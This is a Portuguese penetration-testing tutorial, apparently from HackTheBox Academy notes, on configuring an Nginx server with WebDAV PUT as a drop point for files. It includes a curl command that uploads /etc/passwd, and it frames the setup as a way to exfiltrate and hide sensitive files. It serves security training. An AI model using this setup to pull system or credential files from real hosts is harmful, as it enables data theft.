A transferência de arquivos pela Web é amplamente utilizada, principalmente porque os protocolos HTTP/HTTPS são comumente permitidos por firewalls. Um benefício significativo é que, na maioria dos casos, o arquivo é criptografado durante o trânsito. Isso é crucial em testes de penetração, pois a transferência de dados sensíveis sem criptografia pode ser detectada por sistemas de detecção de intrusão (IDS) e levar a questionamentos sobre a segurança das práticas empregadas.

## Ngnix - Habilitando PUT

Uma boa alternativa para transferir arquivos `Apache`é [o Nginx](https://www.nginx.com/resources/wiki/) porque a configuração é menos complicada e o sistema de módulos não leva a problemas de segurança como `Apache`pode acontecer.

Ao permitir `HTTP`uploads, é essencial ter 100% de certeza de que os usuários não podem fazer upload de shells da web e executá-los. `Apache`torna fácil dar um tiro no próprio pé com isso, já que o `PHP`módulo adora executar qualquer coisa que termine em `PHP`. Configurar `Nginx`para usar PHP não é nem de longe tão simples.

#### Crie um diretório para manipular arquivos enviados
```shell-session
NycolasES6@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory
```

#### Alterar o proprietário para www-data
```shell-session
NycolasES6@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

#### Criar arquivo de configuração Nginx
Crie o arquivo de configuração do Nginx criando o arquivo `/etc/nginx/sites-available/upload.conf`com o conteúdo:
```shell-session
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

#### Crie um link simbólico para nosso site no diretório habilitado para sites
```shell-session
NycolasES6@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

#### Iniciar Nginx
```shell-session
NycolasES6@htb[/htb]$ sudo systemctl restart nginx.service
```

Se recebermos alguma mensagem de erro, verifique `/var/log/nginx/error.log`. Se estiver usando Pwnbox, veremos que a porta 80 já está em uso.

#### Verificando Erros
```shell-session
NycolasES6@htb[/htb]$ tail -2 /var/log/nginx/error.log

2020/11/17 16:11:56 [emerg] 5679#5679: bind() to 0.0.0.0:`80` failed (98: A`ddress already in use`)
2020/11/17 16:11:56 [emerg] 5679#5679: still could not bind()
```

```shell-session
NycolasES6@htb[/htb]$ ss -lnpt | grep 80

LISTEN 0      100          0.0.0.0:80        0.0.0.0:*    users:(("python",pid=`2811`,fd=3),("python",pid=2070,fd=3),("python",pid=1968,fd=3),("python",pid=1856,fd=3))
```

```shell-session
NycolasES6@htb[/htb]$ ps -ef | grep 2811

user65      2811    1856  0 16:05 ?        00:00:04 `python -m websockify 80 localhost:5901 -D`
root        6720    2226  0 16:14 pts/0    00:00:00 grep --color=auto 2811
```

Vemos que já há um módulo escutando na porta 80. Para contornar isso, podemos remover a configuração padrão do Nginx, que é vinculada à porta 80.

#### Remover configuração NginxDefault
```shell-session
NycolasES6@htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default
```

Agora podemos testar o upload usando `cURL`para enviar uma `PUT`solicitação. No exemplo abaixo, faremos upload do `/etc/passwd`arquivo para o servidor e o chamaremos de users.txt

#### Carregar arquivo usando cURL
```shell-session
NycolasES6@htb[/htb]$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```

```shell-session
NycolasES6@htb[/htb]$ sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt 

user65:x:1000:1000:,,,:/home/user65:/bin/bash
```


Depois que tivermos isso funcionando, um bom teste é garantir que a listagem de diretórios não esteja habilitada navegando para `http://localhost/SecretUploadDirectory`. Por padrão, com `Apache`, se atingirmos um diretório sem um arquivo de índice (index.html), ele listará todos os arquivos. Isso é ruim para nosso caso de uso de arquivos exfilling porque a maioria dos arquivos é sensível por natureza, e queremos fazer o nosso melhor para ocultá-los. Graças a `Nginx`ser mínimo, recursos como esse não são habilitados por padrão.

















